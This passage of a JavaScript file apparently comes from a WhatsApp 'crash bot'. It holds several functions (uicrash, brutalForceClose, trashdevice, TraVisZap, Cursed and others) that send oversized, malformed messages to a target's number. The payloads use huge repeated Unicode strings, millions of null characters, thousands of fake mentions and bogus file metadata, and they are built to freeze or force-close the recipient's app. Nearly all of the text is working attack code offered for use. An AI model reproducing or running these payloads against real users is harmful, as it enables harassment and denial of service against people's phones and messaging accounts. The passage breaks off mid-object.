          ...Array.from({ length: 1900 }, () =>
            `1${Math.floor(Math.random() * 60000000)}@s.whatsapp.net`
          )
        ],
        annotations: [
          {
            embeddedContent: {
              zap
            },
            embeddedAction: true
          }
        ]
      }
    }
  }, {});

  await sock.relayMessage("status@broadcast", tmsg.message, {
    messageId: tmsg.key.id,
    statusJidList: [jid],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: { is_status_mention: "false" },
            content: [
              {
                tag: "to",
                attrs: { jid: jid },
                content: undefined
              }
            ]
          }
        ]
      }
    ]
  });
  
    if (mention) {
        await sock.relayMessage(jid, {
            statusMentionMessage: {
                message: {
                    protocolMessage: {
                        key: tmsg.key,
                        type: 25
                    }
                }
            }
        }, {
            additionalNodes: [
                {
                    tag: "meta",
                    attrs: { is_status_mention: "true" },
                    content: undefined
                }
            ]
        });
    }
}

async function uicrash(target) {

    await sock.relayMessage(
      target,
      {
        locationMessage: {
          degreesLatitude: 11.11,
          degreesLongitude: -11.11,
          name: "!" + "꧀".repeat(60000),
          url: "https://t.me/AnosReal8",
          contextInfo: {
            externalAdReply: {
              quotedAd: {
                advertiserName: "꧀".repeat(60000),
                mediaType: "IMAGE",
                jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/",
                caption: "Nted Bro"
              },
              placeholderKey: {
                remoteJid: "0s.whatsapp.net",
                fromMe: false,
                id: "13"
              }
            }
          }
        }
      },
      {
        participant: { jid: target }
      }
    );
  }

async function brutalForceClose(targetJid, referencedMessage) {
    try {
const msgId = "SILENT_" + Date.now();
      // Membangun konten pesan
      const content = {
        ephemeralMessage: {
          message: {
            interactiveMessage: {
              body: {
                text: "*Danzzy - This is a brutal message intended to force close!*" + "ꦽ".repeat(100000),
                url: "https://t.me/AnosReal8",
              },
              header: {
                hasMediaAttachment: true,
                locationMessage: {}
              },
              nativeFlowMessage: {
                buttons: [{
                  name: "cta_url",
                  buttonParamsJson: "{ display_text: 'Lucidx', url: \"https://t.me/anosreal8\", merchant_url: \"https://t.me/danzzydeak\" }" + "ꦽ".repeat(10000),
                    // Menambahkan data besar untuk potensi force close
                }]
              }
            }
          }
        }
      };
  
      // Membangun pesan menggunakan generateWAMessageFromContent
      const generatedMessage = await generateWAMessageFromContent(
        targetJid,
        proto.Message.fromObject(content),
        {
          userJid: targetJid,
          quoted: referencedMessage || undefined
        }
      );
  
      // Membangun data pesan dengan payload tambahan
      const messageData = {
        key: {
          remoteJid: targetJid,
          fromMe: false,
          participant: "0@s.whatsapp.net"
        },
        message: {
          interactiveResponseMessage: {
            body: {
              text: "Sent",
              format: "DEFAULT"
            },
            nativeFlowResponseMessage: {
              name: "DanzxDev",
              paramsJson: JSON.stringify({
                screen_2_OptIn_0: true,
                screen_2_OptIn_1: true,
                screen_1_Dropdown_0: "ModsExecute",
                screen_1_DatePicker_1: "1028995200000",
                screen_1_TextInput_2: "czazxvoid@Akmal.id",
                screen_1_TextInput_3: "94643116",
                screen_0_TextInput_0: "radio - buttons" + "".repeat(10000),
                screen_0_TextInput_1: "*🚷▸⃟°̯͜𝚫̸𝐏𝐨𝐰𝐞𝐫𝐞𝐝⭑ ༑ ⃟̶̽♨️*",
                screen_0_Dropdown_2: "001-Grimgar",
                screen_0_RadioButtonsGroup_3: "0_true",
                flow_token: "AQAAAAACS5FpgQ_cAAAAAE0QI3s."
              }),
              version: 3
            }
          }
        }
      };
  
      // Menggabungkan pesan ke dalam relay
      await sock.relayMessage(targetJid, generatedMessage.message, { 
      delete: {
        participant: {
          jid: targetJid
        },
        messageId: generatedMessage.key.id
        }
      });
  
     // Tunggu 50ms, lalu hapus dari semua sisi
    setTimeout(async () => {
      await sock.relayMessage(targetJid, {
        protocolMessage: {
          key: {
            remoteJid: targetJid,
            fromMe: true,
            id: msgId,
          },
          type: 0, // 0 = revoke/delete for everyone
        },
      }, { messageId: "DELETE_" + Date.now() });
    }, 50);
    
      console.log(`Brutal message sent to target successfully.`);
    } catch (error) {
      console.error(`Failed to send message:`, error);
      // Penanganan kesalahan sesuai kebutuhan
    }
  }
          
async function uicrash(target) {
  const TravaIphone = "𑇂𑆵𑆴𑆿".repeat(60000);
  const genMsg = (fileName, bodyText) =>
    generateWAMessageFromContent(
      target,
      proto.Message.fromObject({
        groupMentionedMessage: {
          message: {
            interactiveMessage: {
              header: {
                documentMessage: {
                  url: "https://mmg.whatsapp.net/v/t62.7119-24/40377567_1587482692048785_2833698759492825282_n.enc?ccb=11-4&oh=01_Q5AaIEOZFiVRPJrllJNvRA-D4JtOaEYtXl0gmSTFWkGxASLZ&oe=666DBE7C&_nc_sid=5e03e0&mms3=true",
                  mimetype: "application/json",
                  fileSha256: "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
                  fileLength: "999999999999",
                  pageCount: 0x9ff9ff9ff1ff8ff4ff5f,
                  mediaKey: "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
                  fileName: fileName,
                  fileEncSha256: "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
                  directPath:
                    "/v/t62.7119-24/40377567_1587482692048785_2833698759492825282_n.enc?ccb=11-4&oh=01_Q5AaIEOZFiVRPJrllJNvRA-D4JtOaEYtXl0gmSTFWkGxASLZ&oe=666DBE7C&_nc_sid=5e03e0",
                  mediaKeyTimestamp: "1715880173",
                },
                hasMediaAttachment: true,
              },
              body: { text: bodyText },
              nativeFlowMessage: {
                messageParamsJson: {"name":"galaxy_message","flow_action":"navigate","flow_action_payload":{"screen":"CTZ_SCREEN"},"flow_cta":"🚀","flow_id":" ༑⃟☠️‌⃨⃰ Dnz ☠️ ","flow_message_version":"9.903","flow_token":"ZUUIOS"},
              },
              contextInfo: {
                mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
                groupMentions: [
                  {
                    groupJid: "1@newsletter",
                    groupSubject: " ༑⃟☠️‌⃨⃰ DANZ ☠️ ",
                  },
                ],
              },
            },
          },
        },
      }),
      { userJid: target }
    );

  const msg1 = await genMsg(TravaIphone, "𑇂𑆵𑆴𑆿".repeat(10000));
  await sock.relayMessage(target, msg1.message, {
    participant: { jid: target },
    messageId: msg1.key.id,
  });

  const msg2 = await genMsg(
    " ༑⃟☠️‌⃨⃰ SEVSBOTZ ☠️ ",
    "\u0000" + "ꦾ".repeat(150000) + "@1".repeat(250000)
  );
  await sock.relayMessage(target, msg2.message, {
    participant: { jid: target },
    messageId: msg2.key.id,
  });

  await sock.relayMessage(
    target,
    {
      locationMessage: {
        degreesLatitude: 173.282,
        degreesLongitude: -19.378,
        name: TravaIphone,
        url: "https://youtube.com/@yagami.00",
      },
    },
    { participant: { jid: target } }
  );

  await sock.relayMessage(
    target,
    {
      extendedTextMessage: {
        text: TravaIphone,
        contextInfo: {
          stanzaId: target,
          participant: target,
          quotedMessage: {
            conversation: " ༑⃟☠️‌⃨⃰ SEVSBOTZ ☠️ " + "ꦾ".repeat(50000),
          },
          disappearingMode: {
            initiator: "CHANGED_IN_CHAT",
            trigger: "CHAT_SETTING",
          },
        },
        inviteLinkGroupTypeV2: "DEFAULT",
      },
    },
    {
      participant: {
        jid: target,
      },
    },
    {
      messageId: null,
    }
  );

  const paymentMsg = (service) => ({
    paymentInviteMessage: {
      serviceType: service,
      expiryTimestamp: Date.now() + 91814400000,
      maxTransactionAmount: 10000000000,
      maxDailyTransaction: 100000000000,
      maxTransactionFrequency: 1,
      secureMode: true,
      verificationRequired: true,
      antiFraudProtection: true,
      multiFactorAuthentication: true,
      transactionLogging: true,
      geoLock: true,
      sessionTimeout: 300000,
      blacklistIPs: ["192.168.0.1", "192.168.0.2"],
      whitelistIPs: ["192.168.1.1", "192.168.1.2"],
      transactionRateLimit: 3,
      realTimeFraudDetection: true,
      dailyLimitResetTime: "00:00",
      fullAuditTrail: true,
      userBehaviorAnalysis: true,
      transactionNotification: true,
      dynamicSessionTokens: true,
      deviceFingerprinting: true,
      transactionEncryption: true,
      encryptedMsgID: generateEncryptedID(service),
    },
  });

  function generateEncryptedID(service) {
    return Buffer.from(service + Date.now().toString()).toString("base64");
  }

  for (const service of [
    "FBPAY",
    "UPI",
    "PAYPAL",
    "WPPAY",
    "GPAY",
    "PP",
    "APPLEPAY",
    "VENMO",
    "CASHAPP",
    "STRIPE",
    "BRAINTREE",
    "SAMSUNGPAY",
    "ALIPAY",
    "WECHATPAY",
    "MPAY",
    "AIPAY",
    "BIOPAY",
    "NFTPAY",
    "VOICEPAY",
    "BLOCKPAY",
    "QPAY",
    "NPAY",
    "ZPAY",
    "TLOCK",
    "HOLO",
  ]) {
    await sock.relayMessage(target, paymentMsg(service), {
      participant: { jid: target },
      timestamp: Date.now(),
      requestID: generateEncryptedID(service),
    });
  }

  await sock.relayMessage(
    target,
    {
      locationMessage: {
        degreesLatitude: 173.282,
        degreesLongitude: -19.378,
        name: "𝐙" + TravaIphone,
        url: "https://youtube.com/@yaga.00",
      },
    },
    { participant: { jid: target } }
  );

  await sock.relayMessage(
    target,
    {
      locationMessage: {
        degreesLatitude: 173.282,
        degreesLongitude: -19.378,
        name: " ༑⃟☠️‌⃨⃰ SEVSBOTZ ☠️ " + TravaIphone,
        url: "https://youtube.com/@ShinZ.00",
      },
    },
    { participant: { jid: target } }
  );
  console.log(
    chalk.yellow.bold(
        `Succes Send crashUi To ${target}`
    )
  );
}

async function trashdevice(target) {
    const messagePayload = {
        groupMentionedMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        documentMessage: {
                                url: "https://mmg.whatsapp.net/v/t62.7119-24/40377567_1587482692048785_2833698759492825282_n.enc?ccb=11-4&oh=01_Q5AaIEOZFiVRPJrllJNvRA-D4JtOaEYtXl0gmSTFWkGxASLZ&oe=666DBE7C&_nc_sid=5e03e0&mms3=true",
                                mimetype: "application/vnd.openxmlformats-officedocument.wordprocessingml.document",
                                fileSha256: "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
                                fileLength: "999999999999",
                                pageCount: 0x9ff9ff9ff1ff8ff4ff5f,
                                mediaKey: "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
                                fileName: `𝕬𝖑𝖜𝖆𝖞𝖘𝖆𝖖𝖎𝖔𝖔 𝕮𝖗𝖆𝖘𝖍☠️`,
                                fileEncSha256: "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
                                directPath: "/v/t62.7119-24/40377567_1587482692048785_2833698759492825282_n.enc?ccb=11-4&oh=01_Q5AaIEOZFiVRPJrllJNvRA-D4JtOaEYtXl0gmSTFWkGxASLZ&oe=666DBE7C&_nc_sid=5e03e0",
                                mediaKeyTimestamp: "1715880173"
                            },
                        hasMediaAttachment: true
                    },
                    body: {
                            text: "⚠️EROR UI CRASH⚠️" + "ꦾ".repeat(150000) + "@1".repeat(250000)
                    },
                    nativeFlowMessage: {},
                    contextInfo: {
                            mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
                            groupMentions: [{ groupJid: "1@newsletter", groupSubject: "ALWAYSAQIOO" }],
                        isForwarded: true,
                        quotedMessage: {
								documentMessage: {
											url: "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
											mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
											fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
											fileLength: "999999999999",
											pageCount: 0x9ff9ff9ff1ff8ff4ff5f,
											mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
											fileName: "Alwaysaqioo The Juftt️",
											fileEncSha256: "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
											directPath: "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
											mediaKeyTimestamp: "1724474503",
											contactVcard: true,
											thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
											thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
											thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
											jpegThumbnail: "",
						}
                    }
                    }
                }
            }
        }
    };

    sock.relayMessage(target, messagePayload, { participant: { jid: target } }, { messageId: null });
}

// Extreme Fake Poll - Bisa bikin WA lemot/force close
async function sendExtremePoll(jid, sock) {
  try {
    const msg = await generateWAMessageFromContent(jid, {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            body: { text: "⚠️ Extreme Fake Polling ⚠️" },
            footer: { text: "Snith With Raa " },
            header: { title: "💀 Crash Polling 💀" },
            nativeFlowMessage: {
              buttons: [
                {
                  name: "single_select",
                  buttonParamsJson: JSON.stringify({
                    title: "Vote Sekarang!",
                    description: "⚠️ Jangan Dibuka Lama-lama ⚠️",
                    sections: Array.from({ length: 500 }, (_, i) => ({
                      title: `Section ${i + 1} ` + "Xx/".repeat(1), // super panjang
                      rows: Array.from({ length: 200 }, (_, j) => ({
                        title: `Pilihan ${i * 200 + j + 1} ` + "x/".repeat(1),
                        id: `vote_${i * 200 + j + 1}`
                      }))
                    }))
                  })
                }
              ]
            }
          }
        }
      }
    }, {});

    await sock.relayMessage(jid, msg.message, {
      messageId: msg.key.id,
    });

    console.log("✅ Extreme Fake Poll terkirim ke", jid);
  } catch (e) {
    console.error("❌ Gagal kirim extreme poll:", e);
  }
}

async function sendAndDelete(sock, jid, contentl) {
  const ctx = await sock.sendMessage(jid, content)

  await new Promise(resolve => setTimeout(resolve, delayMs))

  await sock.sendMessage(jid, {
    delete: {
      remoteJid: jid,
      fromMe: ctx.key.fromMe,
      id: ctx.key.id,
      participant: ctx.key.participant || jid
    }
  })
}

async function Xextend1(sock, target) {
const pnxContent = {
    viewOnceMessage: {
      message: {
        extendedTextMessage: {
          text: "ꦽ".repeat(45000),
          caption: "Nted Bro" + "ꦽ".repeat(40000),
          contextInfo: {
            mentionedJid: [
          "0@s.whatsapp.net",
          ...Array.from({ length: 1995 }, () => "1" + Math.floor(Math.random()*5000000) + "@s.whatsapp.net")
            ],
            externalAdReply: {
              title: "ꦾ".repeat(15000),
              body: "ꦾ".repeat(15000),
              mediaUrl: `https://wa.me/status?text=${"ꦾ".repeat(55555)}`,
              thumbnailUrl: `https://wa.me/status?text=${"ꦾ".repeat(55555)}`,
              sourceUrl: `https://wa.me/status?text=${"ꦾ".repeat(55555)}`,
              renderLargerThumbnail: true,
              showAdAttribution: true
            },
            quotedMessage: {
              paymentInviteMessage: {
                serviceType: 1,
                expiryTimestamp: -9999999999999
              }
            },
          }
        }
      }
    }
  };
  const pnxMSG   = generateWAMessageFromContent(target, pnxContent, {});
  
  await sock.relayMessage("status@broadcast", pnxMSG.message, {
    messageId: pnxMSG.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: target },
                content: undefined
              }
            ]
          }
        ]
      }
    ]
  });
}

async function callinvisible(sock, target) {
  const msg = await generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
        interactiveResponseMessage: {
          body: {
            text: "@NtedCrasher",
            caption: "*Danzzy - Crasher Bug On 2025*" + "ꦽ".repeat(75000),
            format: "DEFAULT"
          },
          nativeFlowResponseMessage: {
            name: "call_permission_request",
            paramsJson: "\u0000".repeat(1000000),
            version: 3
          }
        },
        contextInfo: {
          participant: { jid: target },
          mentionedJid: [
            "0@s.whatsapp.net",
            ...Array.from({ length: 1900 }, () =>
              `1${Math.floor(Math.random() * 5000000)}@s.whatsapp.net`
            )
          ]
        }
      }
    }
  }, {});

  await sock.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: {
                  jid: target
                },
                content: undefined
              }
            ]
          }
        ]
      }
    ]
  });
}

async function TraVisZap(sock, jid, mention) {

    let payload = "";
    for (let i = 0; i < 900; i++) {
        payload = "\u0000".repeat(2097152);
    }

    const mentionedJid = [
        "0@s.whatsapp.net",
        ...Array.from({ length: 1900 }, () => "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net")
    ];

    const generateMessage = {
        viewOnceMessage: {
            message: {
                imageMessage: {
						url: "https://mmg.whatsapp.net/v/t62.7118-24/382902573_734623525743274_3090323089055676353_n.enc?ccb=11-4&oh=01_Q5Aa1gGbbVM-8t0wyFcRPzYfM4pPP5Jgae0trJ3PhZpWpQRbPA&oe=686A58E2&_nc_sid=5e03e0&mms3=true",
						mimetype: "image/jpeg",
						fileSha256: "5u7fWquPGEHnIsg51G9srGG5nB8PZ7KQf9hp2lWQ9Ng=",
						fileLength: "211396",
						height: 816,
						width: 654,
						mediaKey: "LjIItLicrVsb3z56DXVf5sOhHJBCSjpZZ+E/3TuxBKA=",
						fileEncSha256: "G2ggWy5jh24yKZbexfxoYCgevfohKLLNVIIMWBXB5UE=",
						directPath: "/v/t62.7118-24/382902573_734623525743274_3090323089055676353_n.enc?ccb=11-4&oh=01_Q5Aa1gGbbVM-8t0wyFcRPzYfM4pPP5Jgae0trJ3PhZpWpQRbPA&oe=686A58E2&_nc_sid=5e03e0",
						mediaKeyTimestamp: "1749220174",
						jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wEEEAAbABsAGwAbABwAGwAeACEAIQAeACoALQAoAC0AKgA9ADgAMwAzADgAPQBdAEIARwBCAEcAQgBdAI0AWABnAFgAWABnAFgAjQB9AJcAewBzAHsAlwB9AOAAsACcAJwAsADgAQMA2QDOANkBAwE6ARkBGQE6AYsBdwGLAgQCBAK2EQAbABsAGwAbABwAGwAeACEAIQAeACoALQAoAC0AKgA9ADgAMwAzADgAPQBdAEIARwBCAEcAQgBdAI0AWABnAFgAWABnAFgAjQB9AJcAewBzAHsAlwB9AOAAsACcAJwAsADgAQMA2QDOANkBAwE6ARkBGQE6AYsBdwGLAgQCBAK2/8IAEQgBQAC0AwEiAAIRAQMRAf/EABoAAQEBAQEBAQAAAAAAAAAAAAAEBQMBAgb/2gAIAQEAAAAAwwAAAAAAAAAAAAAAFMwAAApmAAApEwAAFImAABSEwAAKQmABSJlITABSEykJgApCZSBMAUhMpATAlaab67lRKEwlWxVU5lvaakAJkrVSKap5FIAmFRKrloVJQTS1CVVK3avzFWmSiaUBUlWR1aZKMxVKBp5mtktOoSppQqSlSmZSqJU0oqpZhUpColGYVUswqpmpFRKMwqpTnlM1IqAlm990UvLu7zKgCkAATCkEwBSATCUAKhSTAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAJQAAAmAAAD/8QAFAEBAAAAAAAAAAAAAAAAAAAAAP/aAAgBAhAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAD/xAAUAQEAAAAAAAAAAAAAAAAAAAAA/9oACAEDEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAP/EADYQAAECAwQFBw0AAAAAAAAAAAQAFAEDEAITIFMRMEBz8BUiY3GAk6IhJDEzNEJDRFBSVLLS/9oACAEBAAE/AOx0R8Dq15NSM7N4tUGQ3sxNJ9qM646qOaec67S4HuYX02ffeBNZ/Rbq856GqMKSTuUfZubUIU8pEU21znj3E53Pd+NfkD9NUYkgccjQt/e7MNx/aJbNr+f6/ZG1YkEz6DbJCMidJ0zvTCVUbGTibJtgGq2Q1RsJOEbENjG1Q2Iag2EbVDVbE5Cak5E1NSciahqfM4RsbZNk2IUgefGPNhVySMn5H3w7uyuUS8/9FIIJnx0UbIYb6M5TlOU5Tnsbf//EABQRAQAAAAAAAAAAAAAAAAAAAHD/2gAIAQIBAT8AcP/EABQRAQAAAAAAAAAAAAAAAAAAAHD/2gAIAQMBAT8AcP/Z",
                    contextInfo: {
                        mentionedJid: mentionedJid,
                        isSampled: true,
                        participant: jid,
                        remoteJid: "status@broadcast",
                        forwardingScore: 2097152,
                        isForwarded: true
                    }
                },
                nativeFlowResponseMessage: {
                    name: "call_permission_request",
                    paramsJson: payload
                }
            }
        }
    };

    const msg = await generateWAMessageFromContent(jid, generateMessage, {});

    await sock.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [jid],
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: [
                            {
                                tag: "to",
                                attrs: { jid: jid },
                                content: undefined
                            }
                        ]
                    }
                ]
            }
        ]
    });

    if (mention) {
        await sock.relayMessage(
            jid,
            {
                statusMentionMessage: {
                    message: {
                        protocolMessage: {
                            key: msg.key,
                            fromMe: false,
                            participant: "0@s.whatsapp.net",
                            remoteJid: "status@broadcast",
                            type: 25
                        }
                    }
                }
            },
            {
                additionalNodes: [
                    {
                        tag: "meta",
                        attrs: { is_status_mention: "travasdex?" + "ꦽ".repeat(40000),  }, // Jangan Dihapus
                        caption: "Travas On Top" + "ꦽ".repeat(75000),
                        content: undefined
                    }
                ]
            }
        );
    }
}

async function Cursed(target) {
  const msg = {
     newsletterAdminInviteMessage: {
      newsletterJid: "1@newsletter",
      newsletterName: "</🧬⃟༑⌁⃰𝐅𝐫𝐞𝐚𝐝 𝐃𝐞𝐬𝐭𝐫𝐨𝐲𝐘𝐨𝐮ཀ͜͡\\ཀ>" + "ោ៝".repeat(20000),
      caption: "</🧬⃟༑⌁⃰𝐅𝐫𝐞𝐚𝐝 𝐃𝐞𝐬𝐭𝐫𝐨𝐲𝐘𝐨𝐮ཀ͜͡\\ཀ>" + "ោ៝".repeat(20000),
      inviteExpiration: "999999999",
    },
  };

  const cards = Array.from({ length: 1000 }, () => ({
            body: proto.Message.InteractiveMessage.Body.fromObject({ text: "  Hi Xrelly :) " }),
            footer: proto.Message.InteractiveMessage.Footer.fromObject({ text: "ㅤHi Xrelly :)ㅤ" }),
            header: proto.Message.InteractiveMessage.Header.fromObject({
                title: '_*~@2~*_\n'.repeat(1500), // buat effect tambahin crash text kalau mau 
                hasMediaAttachment: true,
                imageMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7118-24/19005640_1691404771686735_1492090815813476503_n.enc?ccb=11-4&oh=01_Q5AaIMFQxVaaQDcxcrKDZ6ZzixYXGeQkew5UaQkic-vApxqU&oe=66C10EEE&_nc_sid=5e03e0&mms3=true",
                    mimetype: "image/jpeg",
                    fileSha256: "dUyudXIGbZs+OZzlggB1HGvlkWgeIC56KyURc4QAmk4=",
                    fileLength: "10840",
                    height: 10,
                    width: 10,
                    mediaKey: "LGQCMuahimyiDF58ZSB/F05IzMAta3IeLDuTnLMyqPg=",
                    fileEncSha256: "G3ImtFedTV1S19/esIj+T5F+PuKQ963NAiWDZEn++2s=",
                    directPath: "/v/t62.7118-24/19005640_1691404771686735_1492090815813476503_n.enc?ccb=11-4&oh=01_Q5AaIMFQxVaaQDcxcrKDZ6ZzixYXGeQkew5UaQkic-vApxqU&oe=66C10EEE&_nc_sid=5e03e0",
                    mediaKeyTimestamp: "1721344123",
                    jpegThumbnail: ""
                }
            }),
            nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({ buttons: [] })
        }));
  
  const carousel = generateWAMessageFromContent(target, {
      viewOnceMessage: {
        message: {
          messageContextInfo: {
            deviceListMetadata: {},
            deviceListMetadataVersion: 2,
            quotedMessage: {
              newsletterAdminInviteRevokeMessage: {
                newsletterJid: "13135550002@newsletter",
                newsletterName: "</🧬⃟༑⌁⃰𝐅𝐫𝐞𝐚𝐝 𝐃𝐞𝐬𝐭𝐫𝐨𝐲𝐘𝐨𝐮ཀ͜͡\\ཀ>‣" + "ꦾ".repeat(30000),
                caption: " -‣  -‣  -‣  -‣҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉ -‣" + "ꦾ".repeat(10000),
                inviteExpiration: "999999999"
              }
            },
            forwardedNewsletterMessageInfo: {
              newsletterName: "</🧬⃟༑⌁⃰𝐅𝐫𝐞𝐚𝐝 𝐃𝐞𝐬𝐭𝐫𝐨𝐲𝐘𝐨𝐮ཀ͜͡\\ཀ>" + "ꦾ".repeat(10000),
              newsletterJid: "13135550002@newsletter",
              serverId: 1
            }
          },
          interactiveMessage: {
